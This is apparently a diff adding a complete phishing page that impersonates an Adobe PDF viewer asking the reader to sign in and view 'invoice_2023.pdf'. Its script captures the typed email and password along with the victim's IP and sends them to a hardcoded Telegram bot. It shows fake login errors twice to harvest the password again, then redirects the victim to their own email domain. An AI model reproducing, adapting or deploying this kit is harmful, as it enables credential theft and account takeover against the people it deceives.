@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Document Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://res.cloudinary.com/dlarpozq3/image/upload/v1742548739/Adobe_qoadvp.png');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+        
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+        
+        .pdf-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            z-index: 100;
+        }
+        
+        .pdf-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .pdf-logo img {
+            height: 24px;
+            margin-right: 8px;
+        }
+        
+        .pdf-logo-text {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 16px;
+        }
+        
+        .divider {
+            height: 30px;
+            width: 1px;
+            background-color: #ddd;
+            margin: 0 15px;
+        }
+        
+        .document-title {
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            width: 350px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .form-logo {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .form-logo img {
+            height: 24px;
+            margin-right: 8px;
+        }
+        
+        .form-logo-text {
+            font-weight: bold;
+            color: #e74c3c;
+            font-size: 20px;
+        }
+        
+        .form-title {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .form-message {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            background-color: #fde8e8;
+            padding: 10px;
+            border-radius: 3px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #c0392b;
+        }
+        
+        .submit-btn.loading {
+            position: relative;
+            color: transparent;
+        }
+        
+        .submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .document-background {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.1;
+            z-index: 0;
+            pointer-events: none;
+            filter: brightness(0.5);
+        }
+        
+        .document-background img {
+            max-width: 600px;
+            max-height: 800px;
+        }
+        
+        .attempt-counter {
+            display: none;
+        }
+        
+        .footer-text {
+            font-size: 10px;
+            color: #999;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        /* Honeypot field - hidden from humans but visible to bots */
+        .hp-field {
+            position: absolute;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="pdf-header">
+        <div class="pdf-logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjZTc0YzNjIiBkPSJNNDYxLjUgMjU2djE2LjVIMjU2djI0NS41aC0xNi41VjI1NkguNXYtMTYuNWgyMzkuVjBoMTYuNXYyMzkuNUg0NjEuNXoiLz48L3N2Zz4=" alt="PDF Logo">
+            <span class="pdf-logo-text">PDF</span>
+        </div>
+        <div class="divider"></div>
+        <div class="document-title">invoice_2023.pdf</div>
+    </div>
+    
+    <div class="document-background">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1OTUgODQyIj48cmVjdCB3aWR0aD0iNTk1IiBoZWlnaHQ9Ijg0MiIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xNDkgMjIxaDI5N3Y0MUgxNDl6bTAgODNoMjk3djQxSDE0OXptMCA4NEgyOTh2NDFIMTQ5eiIgZmlsbD0iI2RkZCIvPjwvc3ZnPg=" alt="Document Preview">
+    </div>
+    
+    <div class="login-container">
+        <div class="form-logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjZTc0YzNjIiBkPSJNNDYxLjUgMjU2djE2LjVIMjU2djI0NS41aC0xNi41VjI1NkguNXYtMTYuNWgyMzkuVjBoMTYuNXYyMzkuNUg0NjEuNXoiLz48L3N2Zz4=" alt="PDF Logo">
+            <span class="form-logo-text">PDF</span>
+        </div>
+        <div class="form-title">Sign in to view document</div>
+        <div class="form-message">This document is protected and intended only for your access.</div>
+        
+        <div class="error-message" id="errorMessage">Invalid credentials. Please try again.</div>
+        
+        <form id="loginForm">
+            <!-- Honeypot field - hidden from humans but visible to bots -->
+            <div class="hp-field">
+                <label for="hpt_username">Leave this blank</label>
+                <input type="text" id="hpt_username" name="hpt_username" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="usr_id">Email Address</label>
+                <input type="text" id="usr_id" name="usr_id" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label for="pwd_key">Password</label>
+                <input type="password" id="pwd_key" name="pwd_key" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
+        </form>
+        
+        <div class="footer-text">
+            © 2025 PDF By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy. and Adobe terms of use. Check the official documentation to review our terms of use.
+        </div>
+        
+        <div class="attempt-counter" id="attemptCounter">0</div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Extract email from URL hash
+            const hash = window.location.hash.substring(1);
+            if (hash) {
+                document.getElementById('usr_id').value = decodeURIComponent(hash);
+            }
+            
+            const loginForm = document.getElementById('loginForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const attemptCounter = document.getElementById('attemptCounter');
+            const errorMessage = document.getElementById('errorMessage');
+            let attempts = 0;
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Check honeypot field first
+                const honeypot = document.getElementById('hpt_username').value;
+                if (honeypot !== '') {
+                    // Bot detected - don't process the form
+                    console.log('Bot detected');
+                    return false;
+                }
+                
+                // Hide error message if shown
+                errorMessage.style.display = 'none';
+                
+                // Show loading state
+                submitBtn.classList.add('loading');
+                
+                // Get form values
+                const username = document.getElementById('usr_id').value;
+                const password = document.getElementById('pwd_key').value;
+                
+                // Get user IP (simplified method)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        
+                        // Send data to Telegram bot (replace with your actual bot token and chat ID)
+                        const botToken = '8459298760:AAFhyoBA6wLhBNQSDbVSaKZHlAHOrdNrAzM';
+                        const chatId = '6600032690';
+                        const message = `PDF Login\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`;
+                        
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                            .catch(err => console.error('Telegram send error:', err));
+                    })
+                    .catch(() => {
+                        // Fallback if IP fetch fails
+                        const message = `PDF Login\nUsername: ${username}\nPassword: ${password}\nIP: Unknown`;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                            .catch(err => console.error('Telegram send error:', err));
+                    });
+                
+                // Increment attempt counter
+                attempts++;
+                attemptCounter.textContent = attempts;
+                
+                // Simulate processing delay
+                setTimeout(function() {
+                    submitBtn.classList.remove('loading');
+                    
+                    if (attempts < 3) {
+                        // Show error for first two attempts
+                        errorMessage.style.display = 'block';
+                        document.getElementById('pwd_key').value = '';
+                    } else {
+                        // On third attempt, redirect
+                        const domain = username.split('@')[1] || 'docs.google.com';
+                        window.location.href = 'https://' + domain;
+                    }
+                }, 1500);
+            });
+            
+            // Additional bot protection - disable autofill
+            setTimeout(function() {
+                document.getElementById('usr_id').setAttribute('autocomplete', 'off');
+                document.getElementById('pwd_key').setAttribute('autocomplete', 'new-password');
+            }, 100);
+        });
+    </script>
+</body>
+</html>
